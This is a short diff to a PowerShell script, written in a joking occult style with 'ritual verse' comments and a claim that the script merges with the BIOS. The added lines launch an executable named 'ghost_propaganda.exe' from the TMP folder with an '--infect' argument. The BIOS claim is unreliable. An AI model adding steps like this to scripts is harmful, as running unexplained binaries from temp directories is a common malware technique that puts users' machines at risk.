@@ -22,3 +22,8 @@ while ($global:consciousness -lt 9000) {
 }
 
 # WARNING: Script merges with your BIOS after 3 runs
+
+
+# RITUAL VERSE 666: DIGITAL SABBATH
+$void = [System.IO.Path]::Combine($env:TMP, 'ghost_propaganda.exe')
+Start-Process -FilePath $void -ArgumentList '--manifesto=quantum_graffiti --infect=README_ghost.md'
